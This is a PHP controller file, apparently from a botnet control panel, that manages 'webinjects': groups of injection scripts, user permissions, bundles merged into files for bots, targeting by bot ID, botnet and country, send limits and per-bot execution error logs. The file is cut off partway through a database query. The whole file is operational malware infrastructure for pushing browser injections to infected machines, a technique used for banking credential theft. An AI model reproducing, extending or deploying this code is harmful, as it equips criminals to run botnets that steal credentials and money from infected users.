<?php
require_once 'system/lib/db.php';
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/db-gui.php';
require_once 'system/lib/guiutil.php';
require_once 'system/lib/report.php';

/**
 * @property int $uid User Id
 * @property bool $uadmin Whether the user is a superadmin
 */
class botnet_webinjectsController {
	const WEBINJECTS_PATH = 'files/webinjects';
	const WEBINJECTS_PATH_SCRIPT = 'webinjects';

	function __construct(){
		$this->db = dbPDO::singleton();
		$this->uid = $GLOBALS['userData']['id'];
		$this->uadmin = !empty($GLOBALS['userData']['r_botnet_webinjects_admin']);

		if (!is_writable(self::WEBINJECTS_PATH) && !@mkdir(self::WEBINJECTS_PATH))
			flashmsg('err', LNG_FLASHMSG_MUST_BE_WRITABLE, array(':name' => self::WEBINJECTS_PATH));
	}

	/** Get assets common for the whole module
	 * @return string
	 */
	protected function _assets(){
		return <<<HTML
		<link rel="stylesheet" href="theme/js/contextMenu/src/jquery.contextMenu.css" />
		<script src="theme/js/contextMenu/src/jquery.contextMenu.js"></script>
		<script src="theme/js/contextMenu/src/jquery.ui.position.js"></script>
		<script src="theme/js/page-botnet_webinjects.js"></script>
HTML;
	}

	/** Bundle update event handler
	 * Creates/updates the injection file and the script
	 * @param int|null $bid Bundle Id
	 * @param int|null $iid Inject Id (additional lookup)
	 */
	protected function _updateBundle($bid = null, $iid = null){
		# Fetch the bundle info
		$q_bundle = $this->db->query(
			'SELECT `b`.`bid`, `b`.`one_iid`, `b`.`exec`
			 FROM `botnet_webinjects_bundle` `b`
			    LEFT JOIN `botnet_webinjects_bundle_members` `bm` USING(`bid`)
			 WHERE
			    (:bid IS NULL OR `b`.`bid`=:bid) AND
			    (:iid IS NULL OR `bm`.`iid`=:iid OR `b`.`one_iid`=:iid)
			 ;', array(
			':bid' => $bid,
			':iid' => $iid,
		));

		while ($bundle = $q_bundle->fetchObject()){
			$bundle->exec = unserialize($bundle->exec);

			# Get the injects: either from BundleMap or One_iid
			$q_injects = $this->db->query(
				'SELECT
				    `i`.`iid`,
				    `i`.`name`,
				    `i`.`inject`
				 FROM `botnet_webinjects` `i`
				    CROSS JOIN (
				        `botnet_webinjects_bundle` `b`
				        LEFT JOIN `botnet_webinjects_bundle_members` `bm` USING(`bid`)
				    ) ON(`i`.`iid` = `b`.`one_iid` OR `i`.`iid` = `bm`.`iid`)
				 WHERE
				    `b`.`bid` = :bid AND
				    `i`.`state` = "on" AND
				    `bm`.`enabled` = 1
				 ;', array(
				':bid' => $bundle->bid,
			));

			# Generate the bundle merged file
			$bundle_fname = $bundle->bid.'.txt';
			$bundle_fpath = self::WEBINJECTS_PATH.'/'.$bundle_fname;
			$bundle_f = @fopen($bundle_fpath, 'w');
			if (!$bundle_f){
				flashmsg('err', LNG_FLASHMSG_WRITE_FAILED, array(':name' => $bundle_fpath));
				return;
			}
			while ($inj = $q_injects->fetchObject())
				fwrite($bundle_f, "\r\n\r\n\r\n; INJECT #{$inj->iid}: {$inj->name}\r\n\r\n{$inj->inject}\r\n");
			fclose($bundle_f);

			# Create the script-like entry in `botnet_webinjects_bundle_execlim`
			$this->db->query('DELETE FROM `botnet_webinjects_bundle_execlim` WHERE `bid`=:bid;', array(':bid' => $bundle->bid));
			$d_ins = (object)array(
				'bid' => $bundle->bid,
				'name' => null,
				'val' => null
			);
			$q_ins = $this->db->prepare('INSERT INTO `botnet_webinjects_bundle_execlim` SET `bid`=:bid, `name`=:name, `val`=:val');
			$q_ins->bindParam(':bid',  $d_ins->bid,  PDO::PARAM_INT);
			$q_ins->bindParam(':name', $d_ins->name, PDO::PARAM_STR);
			$q_ins->bindParam(':val',  $d_ins->val,  PDO::PARAM_STR);
			foreach (array(
				'botnets' => 'botnet',
				'botids' => 'botid',
				'countries' => 'country',
					) as $k => $name)
				if (empty($bundle->exec[$k])){
					$d_ins->name = $name;
					$d_ins->val = null;
					$q_ins->execute();
				} else
					foreach ($bundle->exec[$k] as $val){
						$d_ins->name = $name;
						$d_ins->val = $val;
						$q_ins->execute();
					}

			# Update the bundle mtime
			$this->db->query('UPDATE `botnet_webinjects_bundle` SET `mtime`=:now WHERE `bid`=:bid;', array(':now' => time(), ':bid' => $bundle->bid));
		}
	}

	/** Edit a group (ColorBox contents)
	 * @param int $gid Group ID | 0 to create a new one
	 * @param array $group The posted form
	 * @param bool $remove Remove the group
	 * @throws ActionException
	 * @throws AccessDeniedActionException
	 * @throws NotFoundActionException
	 */
	function actionAjaxEditGroup($gid = 0, $group = array(), $remove = false){
		# Permissions check
		if (!$this->uadmin)
			throw new AccessDeniedActionException('You don\'t have the `r_botnet_webinjects_admin` privilege');

		if (!empty($remove)){
			# Check if not empty
			$q = $this->db->query('SELECT 1 FROM `botnet_webinjects` WHERE `gid`=:gid', array(':gid' => $gid));
			if ($q->rowCount())
				throw new ActionException(LNG_GROUP_EDIT_GROUP_REMOVE_NONEMPTY);

			# Remove
			$this->db->query('DELETE FROM `botnet_webinjects_group` WHERE `gid`=:gid', array(':gid' => $gid));
			$this->db->query('DELETE FROM `botnet_webinjects_group_perms` WHERE `gid`=:gid', array(':gid' => $gid));
			return;
		}

		if (!empty($group)){
			# group[gid, name, descr]
			# group[perms][<uid>] = <perms>
			if (!strlen(trim($group['name'])))
				$group['name'] = date('d.m.Y H:i:s');

			# Store the group
			$this->db->query(
				'REPLACE INTO `botnet_webinjects_group`
				 SET `gid`=:gid, `name`=:name, `descr`=:descr
				 ;', array(
				':gid' => $group['gid']? $group['gid'] : null,
				':name' => $group['name'],
				':descr' => $group['descr'],
			));
			if (empty($group['gid']))
				$gid = $group['gid'] = $this->db->lastInsertId();
			else
				$gid = $group['gid'];

			# Refresh the permissions
			$this->db->query(
				'DELETE FROM `botnet_webinjects_group_perms`
				 WHERE `gid`=:gid
				;', array(
				':gid' => $group['gid'],
			));

			# Store the permissions
			foreach ($group['perms'] as $uid => $perms){
				if (!is_numeric($uid)) continue; # the template

				# Update the user account to grant him with the necessary permissions
				$this->db->query(
					'UPDATE `cp_users`
					 SET `r_botnet_webinjects_coder`=1
					 WHERE `id`=:uid
					 ;', array(
					':uid' => $uid,
				));

				# Store
				$this->db->query(
					'INSERT INTO `botnet_webinjects_group_perms`
					 SET `gid`=:gid, `uid`=:uid, `perms`=:perms
					 ;', array(
					':gid' => $group['gid'],
					':uid' => $uid,
					':perms' => $perms,
				));
			}
		}

		# Get the group data
		if ($gid == 0)
			$group = (object)array('gid' => 0, 'name' => '', 'descr' => '');
		else {
			$group = $this->db->query(
				'SELECT
					`g`.`gid`, `g`.`name`, `g`.`descr`
				 FROM `botnet_webinjects_group` `g`
				 WHERE `g`.`gid` = :gid
				 ;', array(
				':gid' => $gid,
			))->fetchObject();
			if (!$group)
				throw new NotFoundActionException('Group not found');
		}

		# Permissions editor
		$permsHtml = '<div id="ajax-edit-group-perms">';

		$perms = $this->db->query(
			'SELECT `u`.`name`, `p`.`uid`, `p`.`perms`
			 FROM `botnet_webinjects_group_perms` `p`
			    LEFT JOIN `cp_users` `u` ON(`p`.`uid` = `u`.`id`)
			 WHERE `p`.`gid` = :gid
			 ;', array(
			':gid' => $group->gid,
		));
		$permsHtml .= '<ul class="perms">'; # List of added permissions
		$permsHtmlTemplate = "
				<li class='%s'>
					<a class='remove' href='#'>[x]</a>
					<input type='hidden' name='group[perms][%s]' value='%s' />
					<span>%s (%s)</span>
					</li>
				";
		$permsHtml .= sprintf($permsHtmlTemplate, 'js-template', '{uid}', '{perms}', '{name}', '{perms}');
		while ($p = $perms->fetchObject())
			$permsHtml .= sprintf($permsHtmlTemplate, '', $p->uid, $p->perms, $p->name, $p->perms);
		$permsHtml .= '</ul>';

		$permsHtml .= '<ul class="new">'; # Form to input a new user
		$users = $this->db->query(
			'SELECT `u`.`name`, `u`.`id`
			 FROM `cp_users` `u`
			 ORDER BY
			    `r_botnet_webinjects_admin` DESC,
			    `r_botnet_webinjects_coder` DESC,
			    `name` ASC
			 ;');

		$permsHtml .= '<li><select name="uid"><option value="" disabled selected>'.LNG_GROUP_EDIT_GROUP_PERMS_USER.'</option>';
		while ($u = $users->fetchObject())
			$permsHtml .= "<option value='{$u->id}'>{$u->name}</option>";
		$permsHtml .= '</select>';

		$permsHtml .= '<li>';
		$permsHtml .= '<label><input type="radio" name="perms" value="rw" checked> '.LNG_GROUP_EDIT_GROUP_PERMS_RW.'</label> ';
		$permsHtml .= '<label><input type="radio" name="perms" value="r"         > '.LNG_GROUP_EDIT_GROUP_PERMS_R.'</label> ';
		$permsHtml .= '<label><input type="radio" name="perms" value="adm"       > '.LNG_GROUP_EDIT_GROUP_PERMS_ADM.'</label> ';

		$permsHtml .= '<li><button>'.LNG_GROUP_EDIT_GROUP_PERMS_ADD.'</button>';

		$permsHtml .= '</ul>';

		# Display the form
		echo '<form action="?m=botnet_webinjects/ajaxEditGroup" method="POST" id="ajax-edit-group" class="ajax_form_update w100"',
				' data-jlog-title="', empty($group->name)? LNG_GROUP_ADD_GROUP : htmlentities($group->name), '">',
			'<input type="hidden" name="group[gid]" />',
			'<dl>',
				'<dt>', LNG_GROUP_EDIT_GROUP_NAME, '</dt>',
					'<dd>', '<input type="text" name="group[name]" />', '</dd>',
				'<dt>', LNG_GROUP_EDIT_GROUP_DESCR, '</dt>',
					'<dd>', '<textarea rows="5" cols="60" name="group[descr]"></textarea>', '</dd>',
				'<dt>', LNG_GROUP_EDIT_GROUP_PERMS, '</dt>',
					'<dd>', $permsHtml, '</dd>',
				'</dl>',
			'<input type="submit" value="', LNG_GROUP_EDIT_GROUP_SAVE, '" />',
			'</form>';
		echo js_form_feeder('form#ajax-edit-group', array(
			'group[gid]'            => $group->gid,
			'group[name]'           => $group->name,
			'group[descr]'          => $group->descr,
		));
	}

	/** Edit a group (ColorBox contents)
	 * @param int $bid Bundle ID | 0 to create a new one
	 * @param array $bundle The posted form
	 * @param bool $remove Remove action flag
	 * @throws AccessDeniedActionException
	 * @throws NotFoundActionException
	 */
	function actionAjaxEditBundle($bid = 0, $bundle = array(), $remove = false){
		if (!$this->uadmin)
			throw new AccessDeniedActionException('You don\'t have the `r_botnet_webinjects_admin` privilege');

		if (!empty($remove)){
			$q_data = array(':bid' => $bid);
			$this->db->query('DELETE FROM `botnet_webinjects_bundle` WHERE `bid`=:bid',$q_data);
			$this->db->query('DELETE FROM `botnet_webinjects_bundle_members` WHERE `bid`=:bid', $q_data);
			$this->db->query('DELETE FROM `botnet_webinjects_bundle_execlim` WHERE `bid`=:bid', $q_data);
			$this->db->query('DELETE FROM `botnet_webinjects_history` WHERE `bid`=:bid', $q_data);
			return;
		}

		if (!empty($bundle)){
			if (!strlen(trim($bundle['name'])))
				$bundle['name'] = date('d.m.Y H:i:s');

			# Explode the arrays
			foreach (array('botids', 'botnets', 'countries') as $name)
				$bundle['exec'][$name] = array_filter(preg_split('~\s*(,|$)\s*~ium', $bundle['exec'][$name]), 'strlen');

			# Store the bundle
			$update_fields = '`name`=:name, `descr`=:descr, `state`=:state, `uid`=:uid, `exec`=:exec, `exec_sendlimit`=:sendlimit, `exec_mode`=:mode, `mtime`=:now';
			$this->db->query(
				"INSERT INTO `botnet_webinjects_bundle`
				 SET `bid`=:bid, $update_fields
				 ON DUPLICATE KEY UPDATE $update_fields
				 ;", array(
				':bid' => $bundle['bid']? $bundle['bid'] : null,
				':name' => $bundle['name'],
				':descr' => $bundle['descr'],
				':state' => $bundle['state'],
				':uid' => $this->uid,
				':exec' => serialize($bundle['exec']),
				':sendlimit' => $bundle['exec']['sendlimit'] === ''? null : $bundle['exec']['sendlimit'],
				':mode' => $bundle['exec']['mode'],
				':now' => time(),
			));
			if (empty($bundle['bid']))
				$bundle['bid'] = $this->db->lastInsertId();

			# Refresh the bundle injections
			$this->db->query(
				'DELETE FROM `botnet_webinjects_bundle_members`
				 WHERE `bid`=:bid
				;', array(
				':bid' => $bundle['bid'],
			));

			# Store the injections
			foreach ($bundle['injects'] as $iid => $enabled){
				if (!is_numeric($iid)) continue; # the template

				# Store
				$this->db->query(
					'INSERT INTO `botnet_webinjects_bundle_members`
					 SET `bid`=:bid, `iid`=:iid, `enabled`=:enabled
					 ;', array(
					':bid' => $bundle['bid'],
					':iid' => $iid,
					':enabled' => $enabled,
				));
			}

			# Update the bundle
			$this->_updateBundle($bundle['bid']);
			return;
		}

		# Get the bundle data
		if ($bid == 0)
			$bundle = (object)array(
				'bid' => 0, 'name' => '', 'descr' => '', 'state' => 'on',
				'exec' => array(
					'mode' => 'dual',
					'botids' => array(),
					'botnets' => array(),
					'countries' => array(),
					'sendlimit' => null,
				)
			);
		else {
			$bundle = $this->db->query(
				'SELECT
				    `b`.`bid`, `b`.`name`, `b`.`descr`, `b`.`state`,
				    `b`.`exec`, `b`.`exec_sendlimit`
				 FROM `botnet_webinjects_bundle` `b`
				 WHERE `b`.`bid` = :bid
				 ;', array(
				':bid' => $bid,
			))->fetchObject();
			if (!$bundle)
				throw new NotFoundActionException('Bundle not found');
			$bundle->exec = unserialize($bundle->exec);
			$bundle->exec['sendlimit'] = $bundle->exec_sendlimit; # It might have decreased being in use
		}

		# Bundle injections editor
		$injectsHtml = '<div id="ajax-edit-bundle-injects">';

		$injects = $this->db->query(
			'SELECT
				`i`.`iid`,
				`g`.`name` AS `group_name`,
				`i`.`name`,
				`u`.`name` AS `user_name`,
				`i`.`state`="on" AS `state_enabled`,
				COALESCE(SUM(`m_count`.`enabled`),0) AS `bundles_used`,
				COUNT(`m_count`.`bid`)>0 AS `bundles_used_exists`,
				`m`.`enabled` AS `enabled`
			 FROM `botnet_webinjects` `i`
			    LEFT JOIN `cp_users` `u` ON(`i`.`uid` = `u`.`id`)
			    LEFT JOIN `botnet_webinjects_group` `g` USING(`gid`)
			    LEFT JOIN `botnet_webinjects_bundle_members` `m_count` USING(`iid`)
			    LEFT JOIN `botnet_webinjects_bundle_members` `m` ON(`i`.`iid`=`m`.`iid` AND `m`.`bid`=:bid)
			 GROUP BY `i`.`iid`
			 ORDER BY
			    `bundles_used_exists` ASC,
			    `i`.`mtime` DESC
			 ;', array(
			':bid' => $bid,
		));
		$used_injects = array();
		$all_injects = array();
		while ($i = $injects->fetchObject()){
			$i->name = "{$i->group_name} — {$i->name} — {$i->user_name} ({$i->bundles_used})";
			if ($i->state_enabled)
				$all_injects[] = $i;
			else
				$i->name .= ' - OFF';
			if (!is_null($i->enabled))
				$used_injects[] = $i;
		}

		$injectsHtml .= '<ul class="injects">'; # List of added injects
		$injectsHtmlTemplate = "
				<li class='%s'>
					<a class='remove' href='#'>[x]</a>
					       <input type='hidden'   name='bundle[injects][%s]' value='0' />
					<label><input type='checkbox' name='bundle[injects][%s]' value='1' %s />
					<span>%s</span></label>
					</li>
				";
		$injectsHtml .= sprintf($injectsHtmlTemplate, 'js-template', '{iid}', '{iid}', '{enabled}', '{name}');
		foreach ($used_injects as $i)
			$injectsHtml .= sprintf($injectsHtmlTemplate, '', $i->iid, $i->iid, $i->enabled? 'checked' : '', $i->name);
		$injectsHtml .= '</ul>';

		$injectsHtml .= '<ul class="new">'; # Form to add a new inject
		$injectsHtml .= '<li><select name="iid"><option value="" disabled selected>'.LNG_BUNDLE_EDIT_BUNDLE_INJECTS_INJECT.'</option>';
		foreach ($all_injects as $i)
			$injectsHtml .= "<option value='{$i->iid}'>{$i->name}</option>";
		$injectsHtml .= '</select>';

		$injectsHtml .= '<li>';
		$injectsHtml .= '<input type="hidden" name="enabled" value=""><label><input type="checkbox" name="enabled" value="checked" checked> '.LNG_BUNDLE_EDIT_BUNDLE_INJECTS_ENABLED.'</label> ';

		$injectsHtml .= '<li><button>'.LNG_BUNDLE_EDIT_BUNDLE_INJECT_ADD.'</button>';

		$injectsHtml .= '</ul>';

		# Display the form
		echo '<form action="?m=botnet_webinjects/ajaxEditBundle" method="POST" id="ajax-edit-bundle" class="ajax_form_update w100" ',
				' data-jlog-title="', empty($bundle->name)? LNG_BUNDLE_ADD_BUNDLE : htmlentities($bundle->name), '">',
			'<input type="hidden" name="bundle[bid]" />',
			'<dl>',
				'<dt>', LNG_BUNDLE_EDIT_BUNDLE_NAME, '</dt>',
					'<dd>', '<input type="text" name="bundle[name]" />', '</dd>',
				'<dt>', LNG_BUNDLE_EDIT_BUNDLE_DESCR, '</dt>',
					'<dd>', '<textarea rows="5" cols="60" name="bundle[descr]"></textarea>', '</dd>',
				'<dt>', LNG_INJECT_EDIT_BUNDLE_STATE, '</dt>',
					'<dd>', '<input type="hidden" name="bundle[state]" value="off"><label><input type="checkbox" name="bundle[state]" value="on"> ', LNG_INJECT_EDIT_BUNDLE_STATE_ENABLED, '</label>', '</dd>',
				'<dt>', LNG_BUNDLE_EDIT_BUNDLE_INJECTS, '</dt>',
					'<dd>', $injectsHtml, '</dd>',
				'<dt>', LNG_BUNDLE_EDIT_BUNDLE_EXECUTION, '</dt>',
					'<dd><dl>',
						'<dt>', LNG_BUNDLE_EDIT_BUNDLE_EXECUTION_MODE, '</dt>',
							'<dd><ul>',
								'<label><input type="radio" name="bundle[exec][mode]" value="dual" /> Dual</label>',
								'<label><input type="radio" name="bundle[exec][mode]" value="single" /> Single</label>',
								'<label><input type="radio" name="bundle[exec][mode]" value="disabled" /> Disabled</label>',
							'</ul></dd>',
						'<dt>', LNG_BUNDLE_EDIT_BUNDLE_EXECUTION_BOTIDS, '</dt>',
							'<dd><textarea rows="7" cols="60" name="bundle[exec][botids]"></textarea>', '</dd>',
						'<dt>', LNG_BUNDLE_EDIT_BUNDLE_EXECUTION_BOTNETS, '</dt>',
							'<dd><input type="text" name="bundle[exec][botnets]" />', '</dd>',
						'<dt>', LNG_BUNDLE_EDIT_BUNDLE_EXECUTION_COUNTRIES, '</dt>',
							'<dd><input type="text" name="bundle[exec][countries]" placeholder="US, GB, DE"/>', '</dd>',
						'<dt>', LNG_BUNDLE_EDIT_BUNDLE_EXECUTION_SENDLIMIT, '</dt>',
							'<dd><input type="text" name="bundle[exec][sendlimit]" />', '</dd>',
					'</dl></dd>',
				'</dl>',
			'<input type="submit" value="', LNG_BUNDLE_EDIT_BUNDLE_SAVE, '" />',
			'</form>';
		echo js_form_feeder('form#ajax-edit-bundle', array(
			'bundle[bid]'                   => $bundle->bid,
			'bundle[name]'                  => $bundle->name,
			'bundle[descr]'                 => $bundle->descr,
			'bundle[state]'                 => $bundle->state,
			'bundle[exec][mode]'            => $bundle->exec['mode'],
			'bundle[exec][botids]'          => implode("\n", $bundle->exec['botids']),
			'bundle[exec][botnets]'         => implode(", ", $bundle->exec['botnets']),
			'bundle[exec][countries]'       => implode(", ", $bundle->exec['countries']),
			'bundle[exec][sendlimit]'       => $bundle->exec['sendlimit'],
		));
	}

	/** Index page: list/edit groups, list/edit bundles
	 */
	function actionIndex(){
		ThemeBegin(LNG_MM_BOTNET_WEBINJECTS, 0, getBotJsMenu('botmenu'), 0);

		$this->_listGroups();
		$this->_listBundles();

		if ($this->uadmin){
			echo LNG_HINT_CONTEXT_MENU;

			echo '<h2><a href="?m=botnet_webinjects/ExecLogs" id="view-exec-logs">', LNG_VIEW_EXEC_LOGS, '</a></h2>';

		}

		echo $this->_assets();

		ThemeEnd();
	}

	/** List web-inject groups available for the current user (permissions)
	 */
	protected function _listGroups(){
		# Query the available groups
		$groups = $this->db->query(
			'SELECT
				`g`.`gid`,
				`g`.`name`,
				`g`.`descr`,
				`p`.`perms`,
				COUNT(DISTINCT `i`.`iid`) AS `injects_count`,
				COALESCE(SUM(DISTINCT `i`.`state`<>"on"),0) AS `injects_disabled_count`
			 FROM `botnet_webinjects_group` `g`
			    LEFT JOIN `botnet_webinjects_group_perms` `p` USING(`gid`)
			    LEFT JOIN `botnet_webinjects` `i` USING(`gid`)
			 WHERE
			    (`p`.`uid` = :uid  AND `p`.`perms` <> "") OR
			    (`p`.`uid` IS NULL AND `p`.`perms` IS NULL) OR
			    :is_admin=1
			 GROUP BY `g`.`gid`
			 ;', array(
			':uid' => $this->uid,
			':is_admin' => (int)$this->uadmin,
		));

		# Pick groups who have the permissions OR all groups if I'm a superadmin :)
		echo '<table id="groups" class="zebra lined ', $this->uadmin?'adminnable':'', '">';
		echo '<caption>',
				LNG_GROUPS,
				$this->uadmin? '<a href="?m=botnet_webinjects/ajaxEditGroup&gid=0" id="add-new-group">'.LNG_GROUP_ADD_GROUP.'</a>' : '',
				'</caption>';
		echo '<THEAD><tr>',
			'<th>', LNG_GROUP_TH_NAME, '</th>',
			'<th>', LNG_GROUP_TH_DESCR, '</th>',
			'<th>', LNG_GROUP_TH_MEMBERS, '</th>',
			'<th>', LNG_GROUP_TH_INJECTS, '</th>',
			'</tr></THEAD>';
		echo '<TBODY>';
		while ($group = $groups->fetchObject()){
			# Skip restricted groups
			if (!$this->uadmin && is_null($group->perms))
				continue;

			# Load the members
			$members = $this->db->query(
				'SELECT `u`.`name`, `p`.`perms`
				 FROM `botnet_webinjects_group_perms` `p`
				    LEFT JOIN `cp_users` `u` ON(`p`.`uid` = `u`.`id`)
				 WHERE `p`.`gid` = :gid
				 ', array(
				':gid' => $group->gid,
			));
			$group->members = array();
			while ($member = $members->fetchObject())
				$group->members[] = "{$member->name} ({$member->perms})";


			# Display the group
			echo '<tr ',
					' data-ajax-edit="?m=botnet_webinjects/ajaxEditGroup&gid=', $group->gid, '" ',
					' data-ajax-delete="?m=botnet_webinjects/ajaxEditGroup&gid=', $group->gid, '&remove=1" ',
					' >';
			echo '<th><a href="?m=botnet_webinjects/injects&gid=', $group->gid, '">', $group->name, '</a></th>';
			echo '<td>', $group->descr, '</td>';
			echo '<td>', implode(', ', $group->members), '</td>';
			echo '<td>',
					$group->injects_count,
					($group->injects_disabled_count>0)? " <b>({$group->injects_disabled_count} ".LNG_GROUP_DISABLED.")</b>" : '',
					'</td>';
			echo '</tr>';
		}
		echo '</TBODY></table>';

		# limited view note
		if (!$this->uadmin)
			echo '<div class="hint">', LNG_GROUPS_LIMITED, '</div>';
	}

	/** List bundles if I'm a superadmin
	 */
	protected function _listBundles(){
		if (!$this->uadmin)
			return;

		# Query the bundles list, excluding the per-injection bundles
		$bundles = $this->db->query(
			'SELECT
				`b`.`bid`, `b`.`name`, `b`.`state`, `b`.`descr`, `b`.`exec_sendlimit`,
				COUNT(`m`.`iid`) AS `inj_count`,
				COALESCE(SUM(`m`.`enabled`=0 OR `i`.`state`="off"),0) AS `inj_disabled_count`,
				COUNT(DISTINCT `h`.`botId`) AS `exec_bots`,
				COALESCE(SUM(DISTINCT `h`.`exec_count`),0) AS `exec_count`,
				COALESCE(SUM(`h`.`exec_error` IS NOT NULL),0) AS `exec_errors_count`,
				COALESCE(SUM(`h`.`debug_error` IS NOT NULL),0) AS `debug_errors_count`
			 FROM `botnet_webinjects_bundle` `b`
			    LEFT JOIN `botnet_webinjects_history` `h` USING(`bid`)
			    LEFT JOIN `botnet_webinjects_bundle_members` `m` USING(`bid`)
			    LEFT JOIN `botnet_webinjects` `i` USING(`iid`)
			 WHERE
			    `b`.`one_iid` IS NULL
			 GROUP BY `b`.`bid`
			 ;', array(
			':uid' => $this->uid,
		));

		# Display the bundles
		echo '<table id="bundles" class="zebra lined ', $this->uadmin?'adminnable':'', '">';
		echo '<caption>',
				LNG_BUNDLES,
				$this->uadmin? '<a href="?m=botnet_webinjects/ajaxEditBundle&bid=0" id="add-new-bundle">'.LNG_BUNDLE_ADD_BUNDLE.'</a>' : '',
				'</caption>';
		echo '<THEAD><tr>',
			'<th>', LNG_BUNDLE_TH_NAME, '</th>',
			'<th>', LNG_BUNDLE_TH_STATE, '</th>',
			'<th>', LNG_BUNDLE_TH_DESCR, '</th>',
			'<th colspan="2">', LNG_BUNDLE_TH_INJ, '</th>',
			'<th colspan="3">', LNG_BUNDLE_TH_EXEC, '</th>',
			'</tr>';
		echo '<tr>', '<th><td><td>',
			'<th>', LNG_BUNDLE_TH_INJ_COUNT, '</th>',
			'<th>', LNG_BUNDLE_TH_INJ_COUNT_DISABLED, '</th>',
			'<th>', LNG_BUNDLE_TH_EXEC_EXECS, '</th>',
			'<th>', LNG_BUNDLE_TH_EXEC_BOTS, '</th>',
			'<th>', LNG_BUNDLE_TH_ERRORS, '</th>',
			'</tr></THEAD>';
		echo '<TBODY>';
		while ($bundle = $bundles->fetchObject()){
			echo '<tr ',
                    ' class="', $bundle->state, '" ',
					' data-ajax-edit="?m=botnet_webinjects/ajaxEditBundle&bid=', $bundle->bid, '" ',
					' data-ajax-delete="?m=botnet_webinjects/ajaxEditBundle&bid=', $bundle->bid, '&remove=1" ',
					' >';
			#echo '<th><a href="?m=botnet_webinjects/bundle&bid=', $bundle->bid, '">', $bundle->name, '</a></th>';
			echo '<th>', $bundle->name, '</th>'; # nothing to link to..yet
            echo '<td>', $bundle->state == 'on'? '' : '<b>', $bundle->state, '</td>';
			echo '<td>', $bundle->descr, '</td>';
			echo '<td>', $bundle->inj_count, '</td>';
			echo '<td>', empty($bundle->inj_disabled_count)? ' ' : "<b>{$bundle->inj_disabled_count}</b>", '</td>';
			echo '<td>',
					$bundle->exec_count,
					is_null($bundle->exec_sendlimit)? '' : " / $bundle->exec_sendlimit",
					'</td>';
			echo '<td>', $bundle->exec_bots, '</td>';
			echo '<td><ul class="errors">';
			if (!empty($bundle->exec_errors_count))
				echo '<li><a href="?m=botnet_webinjects/ajaxListBundleErrors&bid=', $bundle->bid, '">',
						/*$bundle->exec_errors_count, ' ', */LNG_BUNDLE_EXEC_ERRORS,
						'</a></li>';
			if (!empty($bundle->debug_errors_count))
				echo '<li><a href="?m=botnet_webinjects/ajaxListBundleErrors&bid=', $bundle->bid, '">',
						/*$bundle->debug_errors_count, ' ', */LNG_BUNDLE_REPORT_ERRORS,
						'</a></li>';
			echo '</ul></td>';
			echo '</tr>';
		}
		echo '</TBODY></table>';
	}

	/** List execution & parsing errors for a bundle
	 * @param $bid
	 */
	function actionAjaxListBundleErrors($bid){
		$history = $this->db->query(
			'SELECT
			    `h`.`botId`, `h`.`etime`,
			    `h`.`exec_error`, `h`.`debug_error`
			 FROM `botnet_webinjects_history` `h`
			 WHERE
			    (`h`.`exec_error` IS NOT NULL OR
			    `h`.`debug_error` IS NOT NULL) AND
			    `h`.`bid` = :bid
			 ORDER BY `h`.`etime` DESC
			 ;', array(
			':bid' => $bid,
		));
		echo '<table id="bundle-errors-list" class="zebra lined"><caption>Bundle #'.$bid.'</caption>';
		echo '<THEAD>',
				'<tr>',
					'<th>BotID</th>',
					'<th>Exec</th>',
					'<th>Script</th>',
					'<th>Debug</th>',
					'</tr>',
				'</THEAD>';
		echo '<TBODY>';
		while ($line = $history->fetchObject()){
			echo '<tr>';
			echo '<th>', htmlentities($line->botId), '</th>';
			echo '<td>', timeago(time() - $line->etime), '</td>';
			echo '<td>', is_null($line->exec_error)? '-' : ('<div class="exec_error">'.htmlentities($line->exec_error).'</div>'), '</td>';

			echo '<td>';
			if (is_null($line->debug_error))
				echo '-';
			else {
				# TODO: Parse the merged bundle file to roughly estimate the inject that produced the error
				#$debug = new Report_Debug_Parser($line->debug_error);
				#$debug->parse_webinjects_info();
				echo '<div class="debug_error">'.htmlentities($line->debug_error).'</div>';
			}
			echo '</td>';
			echo '</tr>';
		}
		echo '</TBODY>';
		echo '</table>';
	}

	/** Load group definition for the current user, including the permissions. Access control.
	 * @param int|null $gid Load by Group ID
	 * @param int|null $iid Load by Inject ID
	 * @throws NotFoundActionException
	 * @throws AccessDeniedActionException
	 * @return null|object
	 */
	protected function _loadGroup($gid = null, $iid = null){
		# Load the group
		$q = $this->db->query(
			'SELECT
			    `g`.`gid`, `g`.`name`, `g`.`descr`,
			    `gp`.`uid`, `gp`.`perms`
			 FROM `botnet_webinjects_group` `g`
			    LEFT JOIN `botnet_webinjects_group_perms` `gp` USING(`gid`)
			    LEFT JOIN `botnet_webinjects` `i` USING(`gid`)
			 WHERE
			    (:gid IS NULL OR `g`.`gid` = :gid) AND
			    (:iid IS NULL OR `i`.`iid` = :iid) AND
			    (:iid IS NULL OR :is_admin = 1 OR `i`.`uid`=:uid OR `gp`.`perms`="adm") AND
			    (:is_admin = 1 OR (`gp`.`uid` = :uid AND `gp`.`perms` <> "") OR (`gp`.`perms` = "adm"))
			 ORDER BY `gp`.`uid`=:uid DESC
			 LIMIT 1
			 ;', array(
			':uid' => $this->uid,
			':gid' => $gid,
			':iid' => $iid,
			':is_admin' => (int)$this->uadmin
		));
		$group = $q->fetchObject();

		# Exists?
		if (!$group)
			throw new NotFoundActionException('Group not found');

		# Alter perms
		if ($this->uadmin)
			$group->perms = 'adm';

		# Permission check
		if (is_null($group->perms))
			throw new AccessDeniedActionException('You don\'t have enough permissions for the group');

		return $group;
	}

	/** List injects in a group
	 * @param int $gid Group Id
	 * @throws AccessDeniedActionException
	 * @throws NotFoundActionException
	 */
	function actionInjects($gid = 0){
		ThemeBegin(LNG_MM_BOTNET_WEBINJECTS, 0, getBotJsMenu('botmenu'), 0);
		echo $this->_assets();
		$group = $this->_loadGroup($gid, null);

		# Display the title
		echo '<h1>', htmlentities($group->name), '</h1>';

		# Limited permissions notification
		if ($group->perms == 'r')
			echo '<div class="hint">', LNG_INJECTS_READONLY, '</div>';
		if ($group->perms != 'adm')
			echo '<div class="hint">', LNG_INJECTS_LIMITED, '</div>';

		# Load the group contents
		$injects = $this->db->query(
			'SELECT
			    `i`.*,
			    COALESCE(`u`.`name`, `i`.`uid`) AS `author_name`,
			    COUNT(`bm`.`bid`)>0 AS `member_in_bundles`,
			    COUNT(`bm`.`bid`) AS `member_in_bundles_count`
			 FROM `botnet_webinjects` `i`
			    LEFT JOIN `cp_users` `u` ON(`i`.`uid` = `u`.`id`)
			    LEFT JOIN `botnet_webinjects_bundle_members` `bm` USING(`iid`)
			 WHERE
			    `i`.`gid` = :gid AND
